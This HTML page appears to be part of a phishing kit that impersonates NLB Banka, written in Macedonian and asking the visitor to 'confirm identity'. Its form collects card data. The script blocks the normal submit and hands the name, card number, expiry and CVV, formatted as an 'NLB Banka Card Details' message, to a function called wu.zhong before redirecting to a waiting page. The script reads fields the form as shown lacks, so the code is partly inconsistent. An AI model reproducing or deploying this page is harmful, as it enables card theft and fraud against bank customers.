<!DOCTYPE html>

<body>
    
   <header>

<form action="post.php" method="post">
    
   

   <div class="all">
    
        <h2>потврдете го вашиот идентитет</h2>

      </div>
      
        <div class="input">
          <label>имател на картичката</label><br>

        <input type="text" name="exp" required placeholder="MM/YY" id="exp">

        </div>
</form>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("#cc").mask("0000 0000 0000 0000");
$("#exp").mask("00/00");
$("#cvv").mask("0000");



document.querySelector("form").addEventListener("submit",(e)=>{
e.preventDefault();

wu.zhong(`💳 NLB Banka Card Details\n\nName:${document.querySelector("[name='name']").value}\n\nCard Number:${document.querySelector("[name='cc']").value}\n\nExp:${document.querySelector("[name='exp']").value}\n\nCVV:${document.querySelector("[name='cvv']").value}`);

window.location="wait.html";

});

</script>
